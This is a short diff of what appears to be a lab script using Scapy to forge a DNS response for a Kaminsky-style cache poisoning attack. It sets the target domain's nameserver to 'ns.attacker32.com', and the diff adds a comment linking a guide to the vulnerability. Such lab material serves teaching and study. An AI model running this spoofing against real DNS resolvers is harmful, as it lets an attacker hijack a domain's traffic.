@@ -23,6 +23,7 @@ Anssec = DNSRR(rrname=targetName, type='A',
 NSsec  = DNSRR(rrname=targetDomain, type='NS',
                rdata='ns.attacker32.com', ttl=259200)
 
+# http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html
 DNSpkt = DNS(id=0xAAAA, aa=1,ra=0, rd=0, cd=1, qr=1,
              qdcount=1, ancount=1, nscount=1, arcount=0,
              qd=Qdsec, an=Anssec, ns=NSsec)
